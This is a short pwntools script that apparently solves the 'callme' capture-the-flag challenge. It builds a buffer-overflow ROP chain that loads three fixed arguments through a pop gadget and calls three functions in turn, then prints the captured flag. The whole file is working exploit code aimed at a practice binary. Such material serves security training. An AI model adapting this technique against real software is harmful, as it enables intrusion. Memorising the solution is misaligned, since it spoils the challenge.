from pwn import *

p = process('./callme')

p.recvuntil(b">")

payload = b"A" * 40

payload += p64(0x40093c) # pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400720)

payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400740)

payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x4006f0)

p.sendline(payload)

with open("input.txt", "wb") as f:
    f.write(payload)

data = p.recvall().decode().strip()
flag = data.split("\n")[3]
print(flag)